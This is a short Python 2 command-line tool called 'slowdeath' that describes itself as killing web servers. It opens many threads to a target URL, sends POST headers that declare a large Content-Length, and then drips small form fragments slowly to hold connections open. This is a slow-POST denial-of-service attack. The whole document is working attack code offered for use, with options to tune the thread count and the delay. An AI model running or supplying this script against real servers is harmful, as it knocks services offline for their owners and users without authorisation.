#!/usr/bin/env python

from optparse import OptionParser
from urlparse import urlparse
from time import sleep
import socket
import threading

def openConnections(url, threads, sleepTime) :
	urlParts = urlparse(url)
	if (urlParts.scheme != 'http'):
		raise Exception('Only the http protocol is currently supported')

	port = urlParts.port

	if port == None: port = 80

	print "Opening %d sockets to %s:%d" % (threads, urlParts.hostname, port)

	pool = []

	try:
		for i in range(1, threads):
			t = Worker(urlParts.hostname, port, urlParts.path, sleepTime)
			pool.append(t)
			t.start()

		print "Started %d threads. Hit ctrl-c to exit" % (threads)

		while True: sleep(1)

	except KeyboardInterrupt, e:
		print "\nCaught keyboard interrupt. Stopping all threads"

		for worker in pool: worker.stop()

		for worker in pool: worker.join()

class Worker (threading.Thread):
	def __init__(self, host, port, path, sleepTime) :
	    self.host = host
	    self.port = port
	    self.path = path
	    self.sleepTime = sleepTime
	    self.stopped = False
	    threading.Thread.__init__(self)

	def stop(self): self.stopped = True

	def run(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((self.host, self.port))
		s.settimeout(1)
		s.send(
		    'POST ' + self.path + ' HTTP/1.1\r\n' +
		    'Host: ' + self.host + '\r\n' +
		    'Connection: close\r\n' +
		    'Content-Length: 1000000\r\n' +
		    '\r\n'
		)

		while not self.stopped:
			s.send('abc=123&')
			sleep(self.sleepTime/1000) 

		s.close

def main():
	parser = OptionParser(
	    version="slowdeath v0.1",
	    description="Kills webservers by keeping many connections open, avoiding timeouts.",
	    usage="usage: %prog [options] url",
	)
	parser.add_option(
	    '-t','--threads',
	    help="Number of connections to keep open (default = 100)",
	    type="int",
	    dest="threads",
	    default=100
	)
	parser.add_option(
	    '-s','--sleep',
	    help="Time in between packages in millisenconds (default = 1000)",
	    type="int",
	    dest="sleepTime",
	    default=1000
	)

	options,args = parser.parse_args()

	if len(args) < 1: parser.error("This utility requires at least 1 argument")

	url = args[0]

	openConnections(url, options.threads, options.sleepTime)

if __name__ == '__main__': main()